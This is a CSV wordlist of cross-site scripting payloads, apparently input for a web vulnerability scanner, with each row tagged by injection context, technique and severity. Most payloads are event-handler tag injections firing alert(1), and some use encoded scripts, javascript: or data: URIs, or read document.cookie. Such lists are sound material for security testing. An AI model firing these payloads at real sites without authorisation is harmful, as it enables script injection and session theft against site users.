payload,context,technique,severity,length
"<wbr draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</wbr>",tag_injection,none,medium,64
"<input3 onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</input3>",tag_injection,none,medium,74
<center id=x tabindex=1 onfocusin=alert(1)></center>,tag_injection,none,medium,52
"<meta onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</meta>",tag_injection,none,medium,83
<abbr id=x tabindex=1 onfocus=alert(1)></abbr>,tag_injection,none,medium,46
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>",tag_injection,none,medium,190
"<style>:target {transform: rotate(180deg);}</style><li id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></li>",tag_injection,none,medium,122
"<keygen onmouseleave=""alert(1)"">AnonKryptiQuz</keygen>",tag_injection,none,medium,54
"<wbr onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</wbr>",tag_injection,none,medium,81
"""><h1><IFRAME width=""420"" height=""315"" SRC=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",dom_sink,none,high,156
"<picture draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</picture>",tag_injection,none,medium,70
<br contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,56
"<style>@keyframes x{}</style><applet style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></applet>",tag_injection,none,medium,105
<script>\u{61}lert(1)</script>,script_injection,none,low,30
"<style>@keyframes x{}</style><param style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></param>",tag_injection,none,medium,103
"<ruby oncut=""alert(1)"" contenteditable>AnonKryptiQuz</ruby>",tag_injection,none,medium,59
"<marquee onStart marquee onStart=""javascript:javascript:alert(1)""></marquee onStart>",js_uri,none,medium,84
"perl -e 'print \""&lt;IMG SRC=java\0script&#058;alert(\\""AnonKryptiQuz\\"")&gt;\"";' &gt; out",generic,html_entity,medium,90
"<cite oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</cite>",tag_injection,none,medium,71
"""><body/onload=""{x:onerror=alert};x""",tag_injection,none,low,36
"<cite onclick=""alert(1)"" style=display:block>AnonKryptiQuz</cite>",tag_injection,none,medium,65
"<IMG SRC=x oncanplay=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,60
"<base onclick=""alert(1)"">AnonKryptiQuz</base>",tag_injection,none,medium,45
"<style>@keyframes slidein {}</style><ins style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></ins>",tag_injection,none,medium,160
"<rp draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</rp>",tag_injection,none,medium,62
"<body onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</body>",tag_injection,none,medium,61
"<svg oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,97
<applet onreadystatechange=alert(1)></applet>,tag_injection,none,medium,45
"<frame onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</frame>",tag_injection,none,medium,70
<listing id=x tabindex=1 onactivate=alert(1)></listing>,tag_injection,none,medium,55
"<label onclick=""alert(1)"" style=display:block>AnonKryptiQuz</label>",tag_injection,none,medium,67
"<div draggable=""true"" contenteditable>drag me</div><a ondrop=alert(1) contenteditable style=display:block>drop here</a>",tag_injection,none,medium,119
"<menu draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</menu>",tag_injection,none,medium,86
<menu onpointerleave=alert(1) style=display:block>AnonKryptiQuz</menu>,tag_injection,none,medium,70
"<![><img src=""]><img src=x onerror=alert(AnonKryptiQuz)//"">",tag_injection,none,medium,59
"<nextid draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</nextid>",tag_injection,none,medium,65
window.name='a\x01b',dom_sink,none,low,20
<body onhelp=alert(1)>press F1! (MSIE),tag_injection,none,medium,38
<button popovertarget=x>Click me</button><kbd ontoggle=alert(1) popover id=x>AnonKryptiQuz</kbd>,tag_injection,none,medium,96
"<track onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</track>",tag_injection,none,medium,85
"<meta/content=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==""http-equiv=refresh>",js_uri,none,low,103
<dt onpointerleave=alert(1) style=display:block>AnonKryptiQuz</dt>,tag_injection,none,medium,66
"<iframe onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</iframe>",tag_injection,none,medium,74
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",js_uri,url_encoding,low,114
"<select onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</select>",tag_injection,none,medium,67
%u0022%u003e%u003cscript%u003ealert%u0028%u0027Hello%u0027%u0029%u003c%u002fscript%u003e,generic,none,low,88
"<content onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</content>",tag_injection,none,medium,87
<form><input formaction=javascript:alert(1) type=image value=click>,js_uri,none,medium,67
;alert(1);,generic,none,medium,10
"<content onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</content>",tag_injection,none,medium,75
&#00060,generic,html_entity,low,7
"<style>@keyframes x{}</style><output style=""animation-name:x"" onanimationend=""alert(1)""></output>",tag_injection,none,medium,97
"<div draggable=""true"" contenteditable>drag me</div><table ondragover=alert(1) contenteditable style=display:block>drop here</table>",tag_injection,none,medium,131
"<style>@keyframes x{}</style><col style=""animation-name:x"" onwebkitanimationend=""alert(1)""></col>",tag_injection,none,medium,97
"<video onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</video>",tag_injection,none,medium,72
<tt onpointerenter=alert(1) style=display:block>AnonKryptiQuz</tt>,tag_injection,none,medium,66
<col id=x tabindex=1 onactivate=alert(1)></col>,tag_injection,none,medium,47
%3Cscript%3Ealert(1)%3C/script%00TESTTEST%3E,generic,url_encoding,medium,44
"<style>:target {color:red;}</style><head id=x style=""transition:color 1s"" ontransitionstart=alert(1)></head>",tag_injection,none,medium,108
<event-source src=javascript:alert(1)>,js_uri,none,medium,38
"<var onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</var>",tag_injection,none,medium,59
"<image3 draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</image3>",tag_injection,none,medium,85
"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></option>",tag_injection,none,medium,172
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><multicol id=x style=""position:absolute;"" onanimationcancel=""print()""></multicol>",tag_injection,none,low,185
<data onblur=alert(1) tabindex=1 id=x></data><input autofocus>,tag_injection,none,medium,62
"<style>:target {color:red;}</style><audio id=x style=""transition:color 1s"" ontransitionend=alert(1)></audio>",tag_injection,none,medium,108
"<div draggable=""true"" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>",tag_injection,none,medium,113
<li onpointerleave=alert(1) style=display:block>AnonKryptiQuz</li>,tag_injection,none,medium,66
"<slot onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</slot>",tag_injection,none,medium,84
"<summary onmouseover=""alert(1)"">AnonKryptiQuz</summary>",tag_injection,none,medium,55
<datalist id=x tabindex=1 onfocus=alert(1)></datalist>,tag_injection,none,medium,54
